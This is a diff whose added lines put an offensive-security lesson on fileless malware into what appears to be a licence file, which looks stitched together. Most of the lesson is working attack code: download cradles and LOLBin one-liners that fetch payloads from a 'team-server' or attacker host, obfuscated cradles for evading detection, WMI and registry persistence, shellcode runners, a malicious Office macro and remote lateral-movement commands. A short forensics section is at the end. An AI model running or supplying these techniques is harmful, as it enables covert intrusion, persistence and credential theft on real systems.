@@ -8,7 +8,982 @@ in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
+Fileless Malware Concept and Classification
+Defining "Fileless"
+THE FILELESS SPECTRUM:
+======================
 
+Fileless malware is not binary -- it exists on a spectrum:
+
+Level 1: No Files at All
+  - Entire chain operates in memory
+  - No payload written to disk at any stage
+  - Example: Network exploit -> in-memory shellcode -> reflective C2 agent
+  - Rarest and most sophisticated
+
+Level 2: No Executable Files
+  - May use configuration/data files (scripts, registry entries)
+  - No traditional PE files on disk
+  - Example: PowerShell script downloaded and executed in-memory,
+             persistence via registry value containing script
+
+Level 3: Indirect File Execution
+  - Uses legitimate system executables to run malicious code
+  - The "malicious code" may be in a file but not a traditional executable
+  - Example: mshta.exe running an HTA file, rundll32 with JavaScript
+
+MICROSOFT'S CLASSIFICATION:
+  Type I:   No file activity at all (pure memory-resident)
+  Type II:  No file on the file system (uses registry, WMI repository)
+  Type III: Files required for operation but are not traditional malware
+            (scripts, documents with macros, LOLBins)
+Why Fileless Techniques Matter
+SECURITY CONTROL BYPASS:
+=========================
+
+1. Traditional Antivirus (File Scanning)
+   AV scans files on disk -- nothing to scan if there is no file.
+
+2. Application Whitelisting
+   Fileless techniques use ALREADY-APPROVED system binaries.
+   PowerShell, WMI, mshta, rundll32 are all trusted.
+
+3. File Integrity Monitoring (FIM)
+   FIM watches for new or changed files -- no files, no alerts.
+
+4. Disk Forensics
+   Traditional disk forensics relies on file artifacts.
+   Pure fileless operations leave no disk artifacts.
+
+WHAT FILELESS DOES NOT BYPASS:
+- Behavioral detection (EDR watching process behavior)
+- PowerShell logging (ScriptBlock, Module, Transcription)
+- ETW telemetry (Event Tracing for Windows)
+- Network detection (C2 traffic still flows)
+- Memory forensics (code lives in memory)
+- Kernel callbacks (process creation, thread creation)
+Living Off the Land (LOL)
+LOLBins, LOLLibs, and LOLScripts
+LIVING OFF THE LAND BINARIES (LOLBins):
+========================================
+System binaries that can be abused for:
+- Code execution
+- Downloading files
+- Compiling code
+- Bypassing UAC
+- DLL side-loading
+
+COMMON LOLBins FOR EXECUTION:
+  mshta.exe          - Execute HTA/JavaScript/VBScript
+  rundll32.exe       - Execute DLL exports or JavaScript
+  regsvr32.exe       - Execute scriptlets via COM (Squiblydoo)
+  certutil.exe       - Download and decode files
+  msbuild.exe        - Compile and execute C# inline tasks
+  installutil.exe    - Execute .NET assemblies via installer
+  regasm.exe         - Execute .NET assemblies via COM registration
+  regsvcs.exe        - Execute .NET assemblies via COM+ registration
+  cmstp.exe          - Execute via INF file SCT reference
+  wmic.exe           - Execute via XSL stylesheets
+  forfiles.exe       - Execute commands via file matching
+  pcalua.exe         - Program Compatibility Assistant (proxy exec)
+  bash.exe           - WSL execution
+  wscript.exe        - Execute VBS/JS scripts
+  cscript.exe        - Execute VBS/JS scripts (console)
+
+DOWNLOAD LOLBins:
+  certutil.exe       - certutil -urlcache -split -f <url> <output>
+  bitsadmin.exe      - bitsadmin /transfer job <url> <output>
+  curl.exe           - curl -o <output> <url> (Win10+)
+  powershell.exe     - Various download cradles
+  expand.exe         - expand <url> <output> (cab files)
+  esentutl.exe       - Copy files using /y flag
+  desktopimgdownldr  - Download via COM object
+LOLBin Execution Examples
+# MSHTA - Execute HTA inline or from URL
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))"", 0:close")
+mshta http://team-server/payload.hta
+
+# RUNDLL32 - Execute JavaScript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))")
+
+# REGSVR32 - Squiblydoo (network-based scriptlet)
+regsvr32 /s /n /u /i:http://team-server/payload.sct scrobj.dll
+
+# MSBUILD - Execute C# inline task
+# Requires an XML project file with inline C# task (payload.xml):
+msbuild.exe C:\temp\payload.xml
+# Can also use from network share:
+msbuild.exe \\attacker\share\payload.xml
+
+# WMIC - Execute via XSL stylesheet
+wmic os get /format:"http://team-server/payload.xsl"
+# Local XSL:
+wmic process list /format:"C:\temp\payload.xsl"
+
+# CERTUTIL - Download and decode
+certutil -urlcache -split -f http://team-server/payload.b64 C:\temp\payload.b64
+certutil -decode C:\temp\payload.b64 C:\temp\payload.exe
+
+# CMSTP - Execute via INF file
+cmstp.exe /ni /s C:\temp\payload.inf
+
+# INSTALLUTIL - Execute .NET assembly
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\payload.exe
+LOLAS Reference
+LOLBAS Project: https://lolbas-project.github.io/
+GTFOBins (Linux): https://gtfobins.github.io/
+
+Categories in LOLBAS:
+  - Execute: Run arbitrary code
+  - Download: Fetch files from network
+  - Upload: Exfiltrate data
+  - AWL Bypass: Application Whitelisting bypass
+  - Compile: Compile source to executable
+  - UAC Bypass: Bypass User Account Control
+  - Encode/Decode: Obfuscate data
+  - Copy: Move files between locations
+  - Credentials: Access stored credentials
+PowerShell-Based Fileless Execution
+Download Cradles
+# BASIC CRADLES (in-memory script execution, nothing on disk):
+
+# 1. WebClient DownloadString (most common)
+IEX (New-Object Net.WebClient).DownloadString('http://team-server/payload.ps1')
+
+# 2. Invoke-WebRequest (PowerShell 3+)
+IEX (Invoke-WebRequest -Uri 'http://team-server/payload.ps1' -UseBasicParsing).Content
+
+# 3. Invoke-RestMethod
+IEX (Invoke-RestMethod -Uri 'http://team-server/payload.ps1')
+
+# 4. .NET WebClient with custom headers
+$wc = New-Object Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+$wc.Headers.Add("Cookie", "auth=token123")
+IEX $wc.DownloadString('https://cdn.legit-site.com/update.js')
+
+# 5. COM Object (WinHttp.WinHttpRequest)
+$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$h.Open('GET', 'http://team-server/payload.ps1', $false)
+$h.Send()
+IEX $h.ResponseText
+
+# 6. COM Object (Msxml2.XMLHTTP)
+$x = New-Object -ComObject Msxml2.XMLHTTP
+$x.Open('GET', 'http://team-server/payload.ps1', $false)
+$x.Send()
+IEX $x.ResponseText
+
+# 7. .NET HttpClient (modern .NET)
+$c = [System.Net.Http.HttpClient]::new()
+$r = $c.GetStringAsync('http://team-server/payload.ps1').Result
+IEX $r
+
+# 8. DNS TXT record (exfiltration-friendly network)
+$r = Resolve-DnsName -Name payload.attacker.com -Type TXT
+IEX ($r.Strings -join '')
+Obfuscated Cradles
+# OBFUSCATION TECHNIQUES to evade script-based detection:
+
+# String concatenation
+$u = 'http://te' + 'am-se' + 'rver/pay' + 'load.ps1'
+IEX (New-Object Net.WebClient).DownloadString($u)
+
+# String formatting
+IEX (New-Object ("{2}.{0}{1}" -f 'bCli','ent','Net.We')).("{0}{1}" -f 'Downloa','dString').Invoke('http://team-server/payload.ps1')
+
+# Variable substitution
+${h} = "http://team-server/payload.ps1"
+.('{0}{1}'-f'IE','X') (.('{0}{1}{2}'-f'New','-Ob','ject') ("{0}{1}"-f'Net.We','bClient')).("{0}{1}"-f'Download','String').Invoke(${h})
+
+# Environment variable based
+$env:c = 'IEX (New-Object Net.WebClient).DownloadString("http://team-server/payload.ps1")'
+powershell -ep bypass -c "$env:c | IEX"
+
+# Encoded command (Base64)
+$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://team-server/payload.ps1")'
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell -enc $encoded
+
+# ScriptBlock from byte array
+$bytes = [System.Convert]::FromBase64String("SQBFAFIAIAAA...")
+$script = [System.Text.Encoding]::Unicode.GetString($bytes)
+$sb = [ScriptBlock]::Create($script)
+& $sb
+PowerShell Constrained Language Mode Consideration
+CONSTRAINT: In CLM (Constrained Language Mode), many fileless techniques fail:
+- New-Object is restricted
+- Add-Type is blocked
+- COM objects are blocked
+- .NET types are restricted
+- Only core cmdlets work
+
+BYPASS REQUIRED FIRST (see Module 11, Lesson 04):
+- CLM bypass via InstallUtil, MSBuild, or custom runspace
+- Downgrade to PowerShell v2 (if available, no CLM support)
+- Use alternative scripting (VBScript, JScript) that are not constrained
+WMI-Based Fileless Operations
+WMI for Fileless Execution
+# WMI (Windows Management Instrumentation) enables fileless execution
+# through event subscriptions that persist across reboots
+
+# REMOTE EXECUTION (fileless on target):
+# Process creation via WMI (similar to psexec but no file drop)
+wmic /node:TARGET process call create "powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))"
+
+# PowerShell WMI execution
+Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))"
+
+# CIM (modern replacement for WMI)
+Invoke-CimMethod -ComputerName TARGET -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -ep bypass -enc <ENCODED>"}
+WMI Event Subscription Persistence (Fileless)
+# WMI Event Subscriptions create persistence WITHOUT files on disk
+# Three components: Filter, Consumer, Binding
+
+# 1. EVENT FILTER - When to trigger
+$filterArgs = @{
+    EventNamespace = 'root/cimv2'
+    Name = 'WindowsUpdateCheck'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"
+    QueryLanguage = 'WQL'
+}
+$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs
+
+# 2. EVENT CONSUMER - What to execute (CommandLine Consumer)
+$consumerArgs = @{
+    Name = 'WindowsUpdateHandler'
+    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c `"IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SUVYI...')))`""
+}
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
+
+# 3. BINDING - Link filter to consumer
+$bindingArgs = @{
+    Filter = $filter
+    Consumer = $consumer
+}
+Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
+
+# ALTERNATE CONSUMER: ActiveScript (runs VBScript/JScript directly)
+$consumerArgs = @{
+    Name = 'WindowsUpdateScript'
+    ScriptingEngine = 'VBScript'
+    ScriptText = 'Set objShell = CreateObject("WScript.Shell") : objShell.Run "powershell -ep bypass -c IEX(IWR(''http://team-server/p.ps1''))", 0'
+}
+$consumer = Set-WmiInstance -Namespace root/subscription -Class ActiveScriptEventConsumer -Arguments $consumerArgs
+
+# CLEANUP:
+Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='WindowsUpdateCheck'" | Remove-WmiObject
+Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateHandler'" | Remove-WmiObject
+Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match 'WindowsUpdateCheck' } | Remove-WmiObject
+WMI Repository as Storage
+WMI REPOSITORY AS FILELESS STORAGE:
+=====================================
+The WMI repository (C:\Windows\System32\wbem\Repository\) stores WMI data.
+Attackers can store payloads INSIDE the WMI repository itself.
+
+# Store data in a custom WMI class
+$class = New-Object System.Management.ManagementClass('root\cimv2', $null, $null)
+$class['__CLASS'] = 'Win32_UpdateConfig'
+$class.Qualifiers.Add('static', $true)
+$class.Properties.Add('Payload', [System.Management.CimType]::String, $false)
+$class.Properties['Payload'].Qualifiers.Add('key', $true)
+$class.Put()
+
+# Store payload (base64 encoded)
+$encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\payload.exe"))
+$instance = $class.CreateInstance()
+$instance['Payload'] = $encoded
+$instance.Put()
+
+# Retrieve and execute later
+$stored = Get-WmiObject -Class Win32_UpdateConfig
+$bytes = [Convert]::FromBase64String($stored.Payload)
+# Load in memory via Assembly.Load or reflective injection
+
+FORENSIC NOTE:
+- Data is stored in: C:\Windows\System32\wbem\Repository\OBJECTS.DATA
+- Not easily visible without WMI queries
+- Persists across reboots
+- Survives standard file cleanup
+- Detection: Sysmon 19/20/21, WMI activity logs
+.NET In-Memory Execution
+Assembly.Load from Byte Array
+// The core .NET fileless technique: load assemblies from memory
+// No DLL or EXE touches disk
+
+using System;
+using System.Net;
+using System.Reflection;
+
+class FilelessDotNet {
+    static void Main() {
+        // Download assembly bytes to memory
+        WebClient wc = new WebClient();
+        byte[] assemblyBytes = wc.DownloadData("http://team-server/tool.exe");
+
+        // Load assembly entirely in memory
+        Assembly asm = Assembly.Load(assemblyBytes);
+
+        // Invoke entry point with arguments
+        string[] args = new string[] { "--collect", "All" };
+        asm.EntryPoint.Invoke(null, new object[] { args });
+    }
+}
+PowerShell .NET Assembly Loading
+# Load .NET assembly from memory using PowerShell
+
+# Method 1: Download bytes and load
+$bytes = (New-Object Net.WebClient).DownloadData('http://team-server/Rubeus.exe')
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$assembly.EntryPoint.Invoke($null, @(,@("kerberoast")))
+
+# Method 2: From Base64 string (embedded in script)
+$b64 = "TVqQAAMAAAAE..."  # Base64-encoded assembly
+$bytes = [Convert]::FromBase64String($b64)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$assembly.EntryPoint.Invoke($null, @(,@("dump")))
+
+# Method 3: Using reflection to call static methods
+$bytes = (New-Object Net.WebClient).DownloadData('http://team-server/SharpTool.dll')
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$type = $assembly.GetType("Namespace.ClassName")
+$method = $type.GetMethod("MethodName")
+$method.Invoke($null, @("arg1", "arg2"))
+
+# OPSEC CONCERN: CLR Loading
+# When a non-.NET process loads a .NET assembly, these DLLs are loaded:
+#   - mscoree.dll (CLR bootstrap)
+#   - clr.dll (CLR runtime)
+#   - clrjit.dll (JIT compiler)
+# Sysmon Event 7 logs these DLL loads
+# EDR specifically flags CLR loading in processes like cmd.exe, notepad.exe
+Registry-Resident Malware
+Storing Payloads in Registry
+# The Windows Registry can store binary data up to ~1MB per value
+# Payload lives entirely in the registry -- no file on disk
+
+# STEP 1: Encode payload and store in registry
+$payloadBytes = (New-Object Net.WebClient).DownloadData('http://team-server/beacon.bin')
+$encoded = [Convert]::ToBase64String($payloadBytes)
+
+# Store in a registry value that blends in
+Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' `
+    -Name 'SlowContextMenuEntries' -Value $encoded
+
+# STEP 2: Create a loader that reads from registry and executes
+$loader = @'
+$data = (Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SlowContextMenuEntries').SlowContextMenuEntries
+$bytes = [Convert]::FromBase64String($data)
+# Execute shellcode from bytes...
+# (Use techniques from Lesson 07 for execution)
+'@
+
+# STEP 3: Create persistence that runs the loader
+$encodedLoader = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loader))
+Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
+    -Name 'SecurityHealth' -Value "powershell -ep bypass -w hidden -enc $encodedLoader"
+
+# RESULT: No payload file on disk
+# The payload is stored as a registry value (binary data in base64)
+# The loader is embedded in a Run key as an encoded PowerShell command
+# On user login: Run key -> PowerShell -> reads registry -> decodes -> executes
+Fileless Registry Backdoor Pattern
+REGISTRY-ONLY ATTACK CHAIN:
+==============================
+
+1. STORAGE: Payload stored as REG_SZ or REG_BINARY
+   Location: HKCU\SOFTWARE\Microsoft\<legitimate-looking-key>
+   Content: Base64-encoded shellcode or .NET assembly
+
+2. TRIGGER: Run key, scheduled task, or WMI subscription
+   Points to: powershell.exe with encoded command
+
+3. LOADER: Encoded PowerShell reads registry, decodes, executes
+   Method: [Reflection.Assembly]::Load() or shellcode runner
+
+4. EXECUTION: Payload runs entirely in memory
+   No file ever created on disk
+
+DETECTION:
+- Registry value containing large encoded data
+- PowerShell -enc with long encoded strings
+- Sysmon 13 (Registry value set) for large values
+- Registry value names that do not match expected schema
+Shellcode Runners
+In-Memory Shellcode Execution
+// C# shellcode runner -- executes shellcode without dropping executable payload
+using System;
+using System.Runtime.InteropServices;
+
+class ShellcodeRunner {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start,
+                                       IntPtr param, uint flags, IntPtr id);
+
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr handle, uint ms);
+
+    static void Main() {
+        // Shellcode (XOR encrypted, key = 0xFA)
+        byte[] encrypted = new byte[] { 0xA6, 0x92, 0xDB, ... };
+
+        // Decrypt
+        byte[] shellcode = new byte[encrypted.Length];
+        byte key = 0xFA;
+        for (int i = 0; i < encrypted.Length; i++) {
+            shellcode[i] = (byte)(encrypted[i] ^ key);
+        }
+
+        // Allocate RW memory
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
+                                    0x3000, 0x04); // PAGE_READWRITE
+
+        // Copy shellcode
+        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+
+        // Change to RX (avoid RWX)
+        uint oldProtect;
+        VirtualProtect(addr, (uint)shellcode.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ
+
+        // Execute
+        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(thread, 0xFFFFFFFF);
+    }
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr addr, uint size, uint newProtect,
+                                       out uint oldProtect);
+}
+PowerShell Shellcode Runner
+# PowerShell shellcode execution via delegates (no Add-Type required in some versions)
+
+function Invoke-Shellcode {
+    param([byte[]]$Shellcode)
+
+    $TypeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object Reflection.AssemblyName('a')), 'Run'
+    ).DefineDynamicModule('m').DefineType('t', 'Public')
+
+    # Define P/Invoke methods
+    $VA = $TypeBuilder.DefineMethod('VirtualAlloc',
+        'Public, Static', [IntPtr],
+        @([IntPtr], [UInt32], [UInt32], [UInt32]))
+    # ... (complete P/Invoke definitions)
+
+    $Type = $TypeBuilder.CreateType()
+
+    # Allocate, copy, execute
+    $mem = $Type::VirtualAlloc([IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
+    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $mem, $Shellcode.Length)
+
+    # Create delegate and invoke
+    $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+        $mem, (Get-DelegateType @() ([Void])))
+    $delegate.Invoke()
+}
+
+# Download shellcode and execute in-memory
+$sc = (New-Object Net.WebClient).DownloadData('http://team-server/beacon.bin')
+Invoke-Shellcode -Shellcode $sc
+Reflective Injection for Fileless C2
+Fileless C2 Agent Deployment
+FILELESS C2 DEPLOYMENT CHAIN:
+================================
+
+Step 1: Initial Access (e.g., phishing macro, exploit)
+  |
+  +-- Macro calls PowerShell download cradle
+  |   No file written; cradle runs in memory
+  |
+Step 2: Stager Downloads Shellcode
+  |
+  +-- PowerShell downloads raw shellcode (Beacon, etc.)
+  |   Shellcode stored in PowerShell variable (memory only)
+  |
+Step 3: Process Injection
+  |
+  +-- Shellcode injected into legitimate process
+  |   (explorer.exe, svchost.exe, RuntimeBroker.exe)
+  |   Injection via: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+  |   Or: Early Bird APC injection, NtQueueApcThread
+  |
+Step 4: Reflective Loading
+  |
+  +-- Shellcode reflectively loads C2 agent DLL in target process
+  |   DLL never touches disk
+  |   DLL self-loads via custom PE loader (ReflectiveLoader)
+  |
+Step 5: C2 Communications
+  |
+  +-- C2 agent communicates over HTTPS/DNS/SMB
+  |   All subsequent operations are in-memory
+  |
+Step 6: Post-Exploitation
+  |
+  +-- All tools loaded via execute-assembly (in-memory .NET)
+  +-- Or via BOFs (compiled C objects, in-memory)
+  +-- Credential harvesting from LSASS memory
+  +-- No tools ever written to disk
+
+RESULT: Entire attack chain is fileless from disk perspective
+Sleep Mask and Memory Encryption
+ADVANCED C2 MEMORY PROTECTION:
+================================
+
+Problem: Even fileless implants exist in process memory
+         Memory scanners can find implant code
+
+Solution: Sleep Mask (Cobalt Strike 4.4+)
+  When the beacon is sleeping (not actively communicating):
+  1. Encrypt the beacon's memory region
+  2. Change memory permissions to RW (remove Execute)
+  3. Sleep for the specified interval
+  4. Wake up, restore Execute permission
+  5. Decrypt beacon memory
+  6. Execute C2 callback
+  7. Re-encrypt and sleep
+
+Custom Implementation Concept:
+  1. Before sleep: XOR/AES encrypt all beacon code sections
+  2. Register a timer callback (or use NtDelayExecution)
+  3. On wake: Decrypt, execute, re-encrypt
+  4. Memory scanning during sleep finds only encrypted data
+
+Tools:
+  - Cobalt Strike: Built-in sleep_mask (Malleable C2)
+  - Ekko/Foliage: Open-source sleep obfuscation
+  - Nighthawk: Commercial C2 with sleep encryption
+Fileless Persistence Mechanisms
+WMI + PowerShell Persistence
+# FILELESS PERSISTENCE: No executable file on disk
+
+# Method 1: WMI Event Subscription (covered above)
+# Trigger: System event (boot, login, timer)
+# Action: Execute encoded PowerShell
+
+# Method 2: Registry Run Key with Encoded Command
+$payload = 'IEX (New-Object Net.WebClient).DownloadString("http://team-server/implant.ps1")'
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
+    -Name 'OneDriveSync' `
+    -Value "powershell.exe -w hidden -ep bypass -enc $encoded"
+
+# Method 3: Scheduled Task with Encoded PowerShell
+$action = New-ScheduledTaskAction -Execute "powershell.exe" `
+    -Argument "-w hidden -ep bypass -enc $encoded"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$settings = New-ScheduledTaskSettingsSet -Hidden
+Register-ScheduledTask -TaskName "Microsoft\Windows\NetCfg\HostConfig" `
+    -Action $action -Trigger $trigger -Settings $settings
+
+# Method 4: COM Hijacking (CLSID override)
+# Find a COM object that is loaded by a common process
+# Override InprocServer32 to point to a malicious DLL or scriptlet
+New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{01234567-89AB-CDEF-0123-456789ABCDEF}\InprocServer32' -Force
+Set-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{01234567-89AB-CDEF-0123-456789ABCDEF}\InprocServer32' `
+    -Name '(Default)' -Value 'C:\Windows\System32\scrobj.dll'
+Set-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{01234567-89AB-CDEF-0123-456789ABCDEF}\InprocServer32' `
+    -Name 'ThreadingModel' -Value 'Both'
+# This causes scrobj.dll to load, which can be directed to a scriptlet
+
+# Method 5: BITS Job Persistence
+bitsadmin /create /download UpdateCheck
+bitsadmin /addfile UpdateCheck http://team-server/payload.ps1 C:\Windows\Temp\update.ps1
+bitsadmin /SetNotifyCmdLine UpdateCheck "powershell.exe" "-ep bypass -f C:\Windows\Temp\update.ps1"
+bitsadmin /SetMinRetryDelay UpdateCheck 60
+bitsadmin /resume UpdateCheck
+VBScript and JScript In-Memory Execution
+VBScript Fileless Execution
+' VBScript executed via wscript/cscript or embedded in HTA/SCT files
+
+' Method 1: Download and execute PowerShell via VBScript
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -ep bypass -w hidden -c ""IEX(IWR('http://team-server/p.ps1'))""", 0, False
+
+' Method 2: Direct COM-based execution (no PowerShell)
+Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+http.Open "GET", "http://team-server/payload.vbs", False
+http.Send
+Execute http.ResponseText
+
+' Method 3: Scriptlet (SCT) for regsvr32 execution
+' File: payload.sct (delivered via regsvr32 /s /n /u /i:URL scrobj.dll)
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="TESTING" classid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}">
+<script language="JScript">
+<![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -ep bypass -w hidden -enc ENCODED_PAYLOAD", 0);
+]]>
+</script>
+</registration>
+</scriptlet>
+JScript Fileless Execution
+// JScript executed via wscript/cscript, mshta, or regsvr32
+
+// Method 1: Download and execute via WScript
+var wsc = new ActiveXObject("WScript.Shell");
+var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+http.Open("GET", "http://team-server/payload.ps1", false);
+http.Send();
+wsc.Run("powershell -ep bypass -w hidden -c \"" + http.ResponseText + "\"", 0, false);
+
+// Method 2: DotNetToJScript (.NET in JScript)
+// Loads a .NET assembly serialized as a JScript byte array
+// Uses BinaryFormatter deserialization to load .NET code
+// Tool: DotNetToJScript by James Forshaw
+// This technique loads arbitrary .NET assemblies via JScript
+// without touching disk with an executable
+
+// Method 3: XSL Transform (for WMIC execution)
+// File: payload.xsl
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+    xmlns:user="urn:user">
+<msxsl:script language="JScript" implements-prefix="user">
+function execute(){
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -ep bypass -w hidden -enc ENCODED_PAYLOAD", 0);
+}
+</msxsl:script>
+<xsl:template match="/">
+    <xsl:value-of select="user:execute()"/>
+</xsl:template>
+</xsl:stylesheet>
+// Execute: wmic os get /format:"http://team-server/payload.xsl"
+Macro-Based Fileless Execution
+Office Macro to Fileless Chain
+' VBA macro that creates a fully fileless attack chain
+' No executable file is dropped to disk
+
+Sub AutoOpen()
+    ' Method 1: PowerShell download cradle
+    Dim cmd As String
+    cmd = "powershell -w hidden -ep bypass -c ""IEX(IWR('http://team-server/implant.ps1'))"""
+    CreateObject("WScript.Shell").Run cmd, 0, False
+
+    ' Method 2: WMI Process Creation (alternative to Shell.Run)
+    Dim objWMI As Object
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+    objWMI.Create cmd, Null, Null, pid
+
+    ' Method 3: Shellcode execution via VBA (no PowerShell)
+    ' Uses VBA to call Win32 APIs directly
+    Dim shellcode() As Byte
+    ' ... (shellcode bytes embedded in macro)
+    ' VirtualAlloc, RtlMoveMemory, CreateThread via Declare statements
+End Sub
+
+' API Declarations for Method 3:
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+    ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
+    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
+    ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr
+
+Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+    ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
+    ByVal lpStartAddress As LongPtr, lpParameter As Long, _
+    ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
+Fileless Lateral Movement
+Remote Fileless Execution Methods
+# LATERAL MOVEMENT WITHOUT DROPPING FILES:
+
+# 1. WMI Remote Process Creation
+Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create `
+    -ArgumentList "powershell -ep bypass -w hidden -enc $encodedPayload"
+
+# 2. PowerShell Remoting (WinRM)
+Invoke-Command -ComputerName DC01 -ScriptBlock {
+    IEX (New-Object Net.WebClient).DownloadString('http://team-server/implant.ps1')
+}
+
+# 3. DCOM Remote Execution
+$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "DC01"))
+$com.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-ep bypass -w hidden -enc $encodedPayload", "7")
+
+# 4. PSExec-style (but fileless via named pipe for output)
+# Standard PSExec drops a service binary -- avoid this
+# Instead use Impacket's smbexec which uses cmd.exe + output redirection
+
+# 5. WinRM with PassTheHash (Evil-WinRM)
+# evil-winrm -i DC01 -u admin -H NTLM_HASH
+# Then execute in-memory within the WinRM session
+
+# 6. SCM via RPC (Service Control Manager)
+# Create a service that runs a PowerShell command
+sc.exe \\DC01 create TmpSvc binPath= "cmd /c powershell -ep bypass -enc $encoded" start= demand
+sc.exe \\DC01 start TmpSvc
+sc.exe \\DC01 delete TmpSvc
+# Note: This creates/deletes a service but runs PowerShell in-memory
+Memory Forensics Challenges
+What Memory Analysis Reveals
+MEMORY FORENSICS vs FILELESS MALWARE:
+========================================
+
+WHAT MEMORY FORENSICS CAN FIND:
+1. Injected code in process memory
+   - Unbacked executable pages (not mapped from a file)
+   - PE headers in private memory (MZ/PE signatures)
+   - Tool: Volatility malfind, pe-sieve, Moneta
+
+2. .NET assemblies loaded from byte arrays
+   - CLR metadata in process memory
+   - Assembly names, method names, namespaces
+   - Tool: .NET memory analysis plugins
+
+3. PowerShell script content
+   - Decoded script blocks in PowerShell process memory
+   - Command history in process memory
+   - Tool: Volatility PowerShell plugin, strings analysis
+
+4. Network indicators
+   - C2 URLs, IP addresses in process memory
+   - HTTP headers, authentication tokens
+   - Tool: Volatility netscan, strings with regex
+
+5. Decrypted payloads
+   - During execution, payload MUST be decrypted
+   - Memory dump at right time captures cleartext payload
+   - Tool: Process dump, memory snapshot
+
+WHAT MEMORY FORENSICS STRUGGLES WITH:
+1. Sleep-encrypted implants (payload encrypted during sleep)
+2. Memory-only execution that has completed and freed memory
+3. Stack-based execution (shellcode on stack, then stack reused)
+4. Volatile memory after system reboot (everything lost)
